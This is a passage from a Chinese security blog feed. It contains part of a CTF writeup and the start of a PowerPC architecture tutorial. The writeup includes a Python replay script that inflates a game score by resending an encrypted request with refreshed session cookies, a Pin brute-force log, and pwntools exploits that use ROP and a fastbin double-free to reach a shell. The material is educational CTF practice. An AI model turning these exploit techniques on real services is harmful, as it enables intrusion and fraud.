class="keyword">public</span> <span class="keyword">void</span> <span class="title">addScore</span><span class="params">(<span class="keyword">int</span> arg7)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.score += ((<span class="keyword">long</span>)arg7);</span><br><span class="line">    JSONObject v1 = <span class="keyword">new</span> JSONObject();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        v1.put(<span class="string">"score"</span>, arg7);</span><br><span class="line">        v1.put(<span class="string">"op"</span>, <span class="string">"add"</span>);</span><br><span class="line">        <span class="keyword">this</span>.DATA = v1.toString();</span><br><span class="line">        <span class="keyword">this</span>.URL = <span class="string">"http://"</span> + HttpUnit.baseHOST + <span class="string">"/score/"</span>;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">this</span>.runnable).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v0) &#123;</span><br><span class="line">        v0.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    String v3;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        v3 = HttpUnit.post(MainActivity.<span class="keyword">this</span>.URL, RsaUnit.private_encrypt(MainActivity.<span class="keyword">this</span>.DATA));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Exception v1) &#123;</span><br><span class="line">        v1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Message v2 = <span class="keyword">new</span> Message();</span><br><span class="line">    Bundle v0 = <span class="keyword">new</span> Bundle();</span><br><span class="line">    v0.putString(<span class="string">"value"</span>, v3);</span><br><span class="line">    v2.setData(v0);</span><br><span class="line">    MainActivity.<span class="keyword">this</span>.handler.sendMessage(v2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>抓包可以抓到大飞机加30分的包，发过去后会更新session，更改session后继续发同样的密文直到99999分<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /score/ HTTP/1.1</span><br><span class="line">Content-type: w1nds</span><br><span class="line">User-Agent: Dalvik/2.1.0 (Linux; U; Android 5.1.1; )</span><br><span class="line">Host: 120.194.198.16:8097</span><br><span class="line">Connection: close</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Cookie: session=eyJwbGF5ZXIiOiJQbGF5ZXJOYW1lIiwic2NvcmUiOjUwfQ.XW3OAw.YBB___pWnlc9P560vCQk4H-gA5Y</span><br><span class="line">Content-Length: 175</span><br><span class="line"></span><br><span class="line">MISygCLch93NMojz/DaKAu88RkCQl2aTH/i0W0a3w0m1JBoEcr4YVuWdvb+hSSqWupieWqm0mDMb</span><br><span class="line">BdtJ2TWFeorLJKuF5S5J31lzVqKxeoq2h7PGuFqKiwJVtvA6uIdzjOrmkElvnlTysjE3Y06HjCe1</span><br><span class="line">x+T7s4zN0ahrEdOqC+8=</span><br></pre></td></tr></table></figure></p><p>exp：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_score</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> s</span><br><span class="line">paramsPost = <span class="string">"""MISygCLch93NMojz/DaKAu88RkCQl2aTH/i0W0a3w0m1JBoEcr4YVuWdvb+hSSqWupieWqm0mDMb</span></span><br><span class="line"><span class="string">BdtJ2TWFeorLJKuF5S5J31lzVqKxeoq2h7PGuFqKiwJVtvA6uIdzjOrmkElvnlTysjE3Y06HjCe1</span></span><br><span class="line"><span class="string">x+T7s4zN0ahrEdOqC+8="""</span></span><br><span class="line">cookies = &#123;<span class="string">"session"</span>:s&#125;</span><br><span class="line">response = requests.post(<span class="string">"http://x.x.x.x:xxxx/score/"</span>, data=paramsPost, cookies=cookies)</span><br><span class="line">s2 = response.headers[<span class="string">'Set-Cookie'</span>]</span><br><span class="line">new_s = re.findall(<span class="string">r'session=(.*); HttpOnly; Path=/'</span>,s2)[<span class="number">0</span>]</span><br><span class="line">s = new_s</span><br><span class="line">print(<span class="string">"Response body: %s"</span> % response.content)</span><br><span class="line"><span class="keyword">return</span> response.content</span><br><span class="line"></span><br><span class="line">s=<span class="string">"eyJwbGF5ZXIiOiJQbGF5ZXJOYW1lIiwic2NvcmUiOjYxMDEwfQ.XW3Wbg.4Bla3WMuSxCCv_8AQD9rNJGZ_ME"</span></span><br><span class="line"><span class="keyword">while</span> (<span class="string">'flag'</span> <span class="keyword">not</span> <span class="keyword">in</span> add_score()):</span><br><span class="line"><span class="keyword">pass</span></span><br></pre></td></tr></table></figure></p><h3 id="Dragon-Quest"><a href="#Dragon-Quest" class="headerlink" title="Dragon Quest"></a>Dragon Quest</h3><p>程序读取输入后进行计算，<code>start_quest</code>返回值为0x1337即正确<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fgets(&amp;s, <span class="number">257</span>, <span class="built_in">stdin</span>);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::allocator(&amp;v8, <span class="number">257L</span>L);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>(&amp;v9, &amp;s, &amp;v8);</span><br><span class="line"><span class="built_in">std</span>::allocator&lt;<span class="keyword">char</span>&gt;::~allocator(&amp;v8);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v7, (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v9);</span><br><span class="line">v3 = start_quest((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v7);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v7);</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0x1337</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6, (<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v9);</span><br><span class="line">  reward_strength((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">string</span>::~<span class="built_in">string</span>((<span class="built_in">std</span>::<span class="built_in">string</span> *)&amp;v6);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(</span><br><span class="line">    &amp;<span class="built_in">std</span>::<span class="built_in">cout</span>,</span><br><span class="line">    (<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="string">"\n[-] You have failed. The dragon's power, speed and intelligence was greater.\n"</span>,</span><br><span class="line">    v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>由于代码逻辑非常复杂，根据题目提示，应该使用暴力爆破解题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v6 = <span class="built_in">std</span>::<span class="built_in">string</span>::length(v11) - <span class="number">1L</span>L != legend &gt;&gt; <span class="number">2</span>; <span class="comment">// legend = 0x73 ; 0x73 &gt;&gt; 2 = 28</span></span><br></pre></td></tr></table></figure><p>题目会验证输入长度，可以在伪代码中看出，或者爆破一下输入长度。</p><p>这题需要使用pintool进行爆破，GitHub有ctf专用版:<a href="https://github.com/ChrisTheCoolHut/PinCTF" target="_blank" rel="noopener">https://github.com/ChrisTheCoolHut/PinCTF</a> ，原理是统计不同输入，程序运行的指令数量，判断输入是否正确。本题是example的原题，这是抄袭呀。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">./pinCTF.py -f examples/wyvern_c85f1be480808a9da350faaa6104a19b -i -l obj-intel64/ -sl 28 -r abcdefghijklmnopqrstuvwxyz012345_-+LVMA -sk</span><br><span class="line">[+] iter 0 using d for dAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 1 using r for drAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 2 using 4 for dr4AAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 3 using g for dr4gAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 4 using 0 for dr4g0AAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 5 using n for dr4g0nAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 6 using _ for dr4g0n_AAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 7 using o for dr4g0n_oAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 8 using r for dr4g0n_orAAAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 9 using _ for dr4g0n_or_AAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 10 using p for dr4g0n_or_pAAAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 11 using 4 for dr4g0n_or_p4AAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 12 using t for dr4g0n_or_p4tAAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 13 using r for dr4g0n_or_p4trAAAAAAAAAAAAAA</span><br><span class="line">[+] iter 14 using i for dr4g0n_or_p4triAAAAAAAAAAAAA</span><br><span class="line">[+] iter 15 using c for dr4g0n_or_p4tricAAAAAAAAAAAA</span><br><span class="line">[+] iter 16 using 1 for dr4g0n_or_p4tric1AAAAAAAAAAA</span><br><span class="line">[+] iter 17 using a for dr4g0n_or_p4tric1aAAAAAAAAAA</span><br><span class="line">[+] iter 18 using n for dr4g0n_or_p4tric1anAAAAAAAAA</span><br><span class="line">[+] iter 19 using _ for dr4g0n_or_p4tric1an_AAAAAAAA</span><br><span class="line">[+] iter 20 using i for dr4g0n_or_p4tric1an_iAAAAAAA</span><br><span class="line">[+] iter 21 using t for dr4g0n_or_p4tric1an_itAAAAAA</span><br><span class="line">[+] iter 22 using 5 for dr4g0n_or_p4tric1an_it5AAAAA</span><br><span class="line">[+] iter 23 using _ for dr4g0n_or_p4tric1an_it5_AAAA</span><br><span class="line">[+] iter 24 using L for dr4g0n_or_p4tric1an_it5_LAAA</span><br><span class="line">[+] iter 25 using L for dr4g0n_or_p4tric1an_it5_LLAA</span><br><span class="line">[+] iter 26 using V for dr4g0n_or_p4tric1an_it5_LLVA</span><br><span class="line">[+] iter 27 using M for dr4g0n_or_p4tric1an_it5_LLVM</span><br><span class="line">[+] Found pattern dr4g0n_or_p4tric1an_it5_LLVM</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>pwn不难，没脑洞没坑</p><h3 id="pwn-1"><a href="#pwn-1" class="headerlink" title="pwn 1"></a>pwn 1</h3><p>栈溢出后ROP即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pr = <span class="number">0x0000000000400863</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p.sendlineafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0x78</span>+flat(pr,elf.got[<span class="string">'read'</span>],elf.plt[<span class="string">'puts'</span>],<span class="number">0x400776</span>))</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'read'</span>]</span><br><span class="line">success(hex(libc.address))</span><br><span class="line">p.sendlineafter(<span class="string">'name:'</span>,<span class="string">'a'</span>*<span class="number">0x78</span>+p64(libc.address+<span class="number">0x4526a</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn 2"></a>pwn 2</h3><p>free之后没有清空指针，存在UAF，double free之后直接fastbin attack，其中edit功能可以不用。比赛的时候给的libc是ARM，就问你坑不坑~<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'size:'</span>,str(size))</span><br><span class="line">    p.sendlineafter(<span class="string">'data:'</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">'choice :'</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">'index:'</span>,str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'111'</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'111'</span>) <span class="comment"># 1</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) <span class="number">-0x3c4b20</span><span class="number">-88</span></span><br><span class="line">success(hex(libc.address))</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">'111'</span>) <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'111'</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'111'</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'111'</span>) <span class="comment"># 4</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x50</span>,p64(<span class="number">0x601ffa</span>)) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'4444'</span>) <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'6666'</span>) <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">'a'</span>*<span class="number">0x16</span>+p64(libc.address+<span class="number">0x45216</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;JTWLB-CTF非官方writeup&quot;&gt;&lt;a href=&quot;#JTWLB-CTF非官方writeup&quot; class=&quot;headerlink&quot; title=&quot;JTWLB CTF非官方writeup&quot;&gt;&lt;/a&gt;JTWLB CTF非官方writeup&lt;/h1&gt;&lt;h2 i
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>PowerPC栈溢出初探：从放弃到getshell</title>
    <link href="https://4f-kira.github.io/2019/06/09/powerpc/"/>
    <id>https://4f-kira.github.io/2019/06/09/powerpc/</id>
    <published>2019-06-09T12:44:16.000Z</published>
    <updated>2019-06-09T12:58:09.282Z</updated>
    
    <content type="html"><![CDATA[<p>本文首发于先知论坛 <a href="https://xz.aliyun.com/t/4975" target="_blank" rel="noopener">https://xz.aliyun.com/t/4975</a></p><h1 id="PowerPC"><a href="#PowerPC" class="headerlink" title="PowerPC"></a>PowerPC</h1><p>之前接触的pwn题一般都是x86架构，少数arm和mips，前段时间一场国外的比赛出现了一道PowerPC的题目，对于PowerPC架构的题目还是第一次遇到，借此机会整理一下相关的资料。</p><p><a href="https://zh.wikipedia.org/wiki/PowerPC" target="_blank" rel="noopener">维基百科PowerPC条目</a></p><blockquote><p>PowerPC)英语：Performance Optimization With Enhanced RISC – Performance Computing，有时简称PPC）是一种精简指令集)RISC）架构的中央处理器)CPU），其基本的设计源自IBM的POWER)Performance Optimized With Enhanced RISC；《IBM Connect电子报》2007年8月号译为“增强RISC性能优化”）架构。POWER是1991年，Apple、IBM、Motorola组成的AIM联盟所发展出的微处理器架构。PowerPC是整个AIM联盟平台的一部分，并且是到目前为止唯一的一部分。但苹果电脑自2005年起，将旗下电脑产品转用Intel CPU。</p></blockquote><h2 id="指令集"><a href="#指令集" class="headerlink" title="指令集"></a>指令集</h2><h3 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h3><p>PPC使用RISC精简指令集，指令字长都是32bit，4字节对齐。PPC和IA32 CPU的不同点在于其定义了大量的通用寄存器，这个和ARM和X64有点类似。</p><table><thead><tr><th style="text-align:left">序号</th><th style="text-align:left">寄存器</th><th style="text-align:left">功能</th></tr></thead><tbody><tr><td style="text-align:left">1</td><td style="text-align:left">GPR0-GPR31（共32个寄存器）</td><td style="text-align:left">整数运算和寻址通用寄存器.在ABI规范中，GPR1用于堆栈指针，GPR3-GPR4用于函数返回值，GPR3-GPR10用于参数传递</td></tr><tr><td style="text-align:left">2</td><td style="text-align:left">FPR0-FPR31（共32个寄存器）</td><td style="text-align:left">用于浮点运算。PPC32和PPC64的浮点数都是64位</td></tr><tr><td style="text-align:left">3</td><td style="text-align:left">LR</td><td style="text-align:left">连接寄存器，记录转跳地址，常用于记录子程序返回的地址。</td></tr><tr><td style="text-align:left">4</td><td style="text-align:left">CR</td><td style="text-align:left">条件寄存器。</td></tr><tr><td style="text-align:left">5</td><td style="text-align:left">XER</td><td style="text-align:left">特殊寄存器，记录溢出和进位标志，作为CR的补充</td></tr><tr><td style="text-align:left">6</td><td style="text-align:left">CTR</td><td style="text-align:left">计数器，用途相当于ECX</td></tr><tr><td style="text-align:left">7</td><td style="text-align:left">FPSCR</td><td style="text-align:left">浮点状态寄存器，用于浮点运算类型的异常记录等，可设置浮点异常捕获掩码</td></tr></tbody></table><p>PowerPC ABI 中的寄存器被划分成 3 种基本类型：<strong>专用寄存器</strong>、<strong>易失性寄存器</strong>和<strong>非易失性寄存器</strong>。</p><p><strong>专用寄存器</strong> 是那些有预定义的永久功能的寄存器，例如堆栈指针（r1）和 TOC 指针（r2）。r3 到 r12 是<strong>易失性寄存器</strong>，这意味着任何函数都可以自由地对这些寄存器进行修改，而不用恢复这些寄存器之前的值。而r13及其之上的寄存器都是<strong>非易失性寄存器</strong>。这意味着函数可以使用这些寄存器，前提是从函数返回之前这些寄存器的值已被恢复。因此，在函数中使用非易失性寄存器之前，它的值必须保存到该函数的堆栈帧中，然后在函数返回之前恢复。</p><p>CR寄存器用于反映运算结果、跳转判断条件等，分为以下8组。</p><table><thead><tr><th style="text-align:left">CR0</th><th style="text-align:left">CR1</th><th style="text-align:left">CR2</th><th style="text-align:left">CR3</th><th style="text-align:left">CR4</th><th style="text-align:left">CR5</th><th style="text-align:left">CR6</th><th style="text-align:left">CR7</th></tr></thead><tbody><tr><td style="text-align:left">0-3</td><td style="text-align:left">4-7</td><td style="text-align:left">8-11</td><td style="text-align:left">12-15</td><td style="text-align:left">16-19</td><td style="text-align:left">20-23</td><td style="text-align:left">24-27</td><td style="text-align:left">28-31</td></tr></tbody></table><p>每组4位，分别为LT（小于）、GT（大于）、EQ（等于）、S0（Summary ovweflow）。CR0默认反映整数运算结果，CR1默认反浮点数运算结果。S0是XER寄存器S0位的拷贝。对于比较指令，很容易理解LT、GT、EQ的含义，对于算数运算指令，结果为负数则为LT，正数为GT，0为EQ。</p><p>PowerPC 体系结构本身支持字节（8 位）、半字（16 位）、字（32 位） 和双字（64 位） 数据类型，为方便起见，和IA32做个对比。见下表：</p><table><thead><tr><th style="text-align:left">PPC</th><th style="text-align:left">字长（BITS）</th><th style="text-align:left">简称</th><th style="text-align:left">IA32</th></tr></thead><tbody><tr><td style="text-align:left">BYTE</td><td style="text-align:left">8</td><td style="text-align:left">B</td><td style="text-align:left">BYTE</td></tr><tr><td style="text-align:left">HALF WORD</td><td style="text-align:left">16</td><td style="text-align:left">H</td><td style="text-align:left">WORD</td></tr><tr><td style="text-align:left">WORD</td><td style="text-align:left">32</td><td style="text-align:left">W</td><td style="text-align:left">DWORD</td></tr><tr><td style="text-align:left">DWORD</td><td style="text-align:left">64</td><td style="text-align:left">D</td><td style="text-align:left">QWORD</td></tr></tbody></table><p><strong>通用寄存器</strong></p><table><thead><tr><th style="text-align:left">寄存器</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">r0</td><td style="text-align:left">在函数开始（function prologs）时使用。</td></tr><tr><td style="text-align:left">r1</td><td style="text-align:left">堆栈指针，相当于IA32中的esp寄存器，IDA把这个寄存器反汇编标识为sp。</td></tr><tr><td style="text-align:left">r2</td><td style="text-align:left">内容表（toc）指针，IDA把这个寄存器反汇编标识为rtoc。系统调用时，它包含系统调用号。</td></tr><tr><td style="text-align:left">r3</td><td style="text-align:left">作为第一个参数和返回值。</td></tr><tr><td style="text-align:left">r4-r10</td><td style="text-align:left">函数或系统调用开始的参数，部分情况下r4寄存器也会作为返回值使用。</td></tr><tr><td style="text-align:left">r11</td><td style="text-align:left">用在指针的调用和当作一些语言的环境指针。</td></tr><tr><td style="text-align:left">r12</td><td style="text-align:left">它用在异常处理和glink（动态连接器）代码。</td></tr><tr><td style="text-align:left">r13</td><td style="text-align:left">保留作为系统线程ID。</td></tr><tr><td style="text-align:left">r14-r31</td><td style="text-align:left">作为本地变量，非易失性。</td></tr></tbody></table><p><strong>专用寄存器</strong></p><table><thead><tr><th style="text-align:left">寄存器</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">lr</td><td style="text-align:left">链接寄存器，它用来存放函数调用结束处的返回地址。。</td></tr><tr><td style="text-align:left">ctr</td><td style="text-align:left">计数寄存器，它用来当作循环计数器，会随特定转移操作而递减。</td></tr><tr><td style="text-align:left">xer</td><td style="text-align:left">定点异常寄存器，存放整数运算操作的进位以及溢出信息。</td></tr><tr><td style="text-align:left">msr</td><td style="text-align:left">机器状态寄存器，用来配置微处理器的设定。</td></tr><tr><td style="text-align:left">cr</td><td style="text-align:left">条件寄存器，它分成8个4位字段，cr0-cr7，它反映了某个算法操作的结果并且提供条件分支的机制。</td></tr></tbody></table><p>寄存器r1、r14-r31是非易失性的，这意味着它们的值在函数调用过程保持不变。寄存器r2也算非易失性，但是只有在调用函数在调用后必须恢复它的值时才被处理。</p><p>寄存器r0、r3-r12和特殊寄存器lr、ctr、xer、fpscr是易失性的，它们的值在函数调用过程中会发生变化。此外寄存器r0、r2、r11和r12可能会被交叉模块调用改变，所以函数在调用的时候不能采用它们的值。</p><p>条件代码寄存器字段cr0、cr1、cr5、cr6和cr7是易失性的。cr2、cr3和cr4是非易失性的，函数如果要改变它们必须保存并恢复这些字段。</p><p><strong>异常处理器</strong></p><p>整数异常寄存器XER是一个特殊功能寄存器，它包括一些对增加计算精度有用的信息和出错信息。XER的格式如下： </p><table><thead><tr><th style="text-align:left">寄存器</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">SO 总体溢出标志</td><td style="text-align:left">一旦有溢出位OV置位，SO就会置位。</td></tr><tr><td style="text-align:left">OV 溢出标志</td><td style="text-align:left">当发生溢出时置位，否则清零；在作乘法或除法运算时，如果结果超过寄存器的表达范围，则溢出置位。</td></tr><tr><td style="text-align:left">CA 进位标志</td><td style="text-align:left">当最高位产生进位时，置位，否则清零；扩展精度指令（后述）可以用CA作为操作符参与运算。</td></tr></tbody></table><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">li REG, VALUE</span><br></pre></td></tr></table></figure><p>加载寄存器 REG，数字为 VALUE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add REGA, REGB, REGC</span><br></pre></td></tr></table></figure><p>将 REGB 与 REGC 相加，并将结果存储在 REGA 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addi REGA, REGB, VALUE</span><br></pre></td></tr></table></figure><p>将数字 VALUE 与 REGB 相加，并将结果存储在 REGA 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mr REGA, REGB</span><br></pre></td></tr></table></figure><p>将 REGB 中的值复制到 REGA 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or REGA, REGB, REGC</span><br></pre></td></tr></table></figure><p>对 REGB 和 REGC 执行逻辑 “或” 运算，并将结果存储在 REGA 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ori REGA, REGB, VALUE</span><br></pre></td></tr></table></figure><p>对 REGB 和 VALUE 执行逻辑 “或” 运算，并将结果存储在 REGA 中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and, andi, xor, xori, nand, nand, and nor</span><br></pre></td></tr></table></figure><p>其他所有此类逻辑运算都遵循与 “or” 或 “ori” 相同的模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ld REGA, 0(REGB)</span><br></pre></td></tr></table></figure><p>使用 REGB 的内容作为要载入 REGA 的值的内存地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lbz, lhz, and lwz</span><br></pre></td></tr></table></figure><p>它们均采用相同的格式，但分别操作字节、半字和字(“z” 表示它们还会清除该寄存器中的其他内容)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 